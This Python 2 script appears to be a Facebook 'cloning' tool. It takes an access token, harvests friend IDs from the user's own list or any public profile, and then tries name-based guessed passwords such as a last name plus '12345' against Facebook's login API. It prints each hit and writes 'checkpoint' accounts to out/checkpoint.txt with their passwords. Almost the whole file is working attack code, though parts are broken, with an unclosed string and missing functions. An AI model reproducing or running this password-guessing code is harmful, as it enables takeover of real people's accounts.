os.system("clear")
print  """
\33[1;33m─╔╗╔═╗\33[1;33m╔╦╗╔╦╗╔═╦╗\33[0m
\33[0;36m─║║║╦╝\33[1;33m║╔╝║╔╝╚╗║║\33[0m
\33[1;33m╔╣║║╩╗\33[1;33m║╚╗║╚╗╔╩╗║\33[0m
\33[0;36m╚═╝╚═╝\33[0;36m╚╩╝╚╩╝╚══╝\33[0m
\33[31;1m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\33[31;1m๑۩۩๑\33[31;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;91mAuthor©\033[1;91m: \033[1;93mId Jekky

\033[1;91mYoutube\033[1;91m: \033[1;93mID Jekky.

\033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/ID Jekky

\033[1;91mTeam\033[1;91m: \033[1;93mCyber.Demang 
\033[1;91m«--------------------\033[1;93m✧\033[1;91m--------------------»"""
jalan("\33[1;33m Assalamualaikum Warahmatullahi wabarakhatu   ")
jalan('\33[1;33m Username IDC Password Jekky
print "\033[1;91m«-------------\033[1;93mLogin With Tool\033[1;91m-------------»"

CorrectUsername = "IDC"
CorrectPassword = "Jekky"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;93m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Man50or
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://youtu.be/53tvjO3Rwns')
    else:
        print "\033[1;91mWrong Username"
        os.system('xdg-open https://youtu.be/53tvjO3Rwns')

def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:WE_ARE_ANONYMOUS.
	print logo
	print "  \033[1;97m«---------\033[1;95mLogged in User Info\033[1;97m---------»"
	print "	   \033[1;93m Name\033[1;93m:\033[1;97m"+nama+"\033[1;97m               "
	print "	   \033[1;93m ID\033[1;93m:\033[1;97m"+id+"\x1b[1;97m              "
	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mClone From Friend List..."
	print "\033[1;97m--\033[1;92m> \033[1;92m2.\x1b[1;92mClone From Public ID..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
		jalan('\033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID Link\033[1;93m: \033[1;97m")
		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting IDs\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Mk_tricks
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['last_name'] + '12345'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['last_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '1234'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
                                                                  
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;92m✧\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
		
if __name__ == '__main__':
	login()
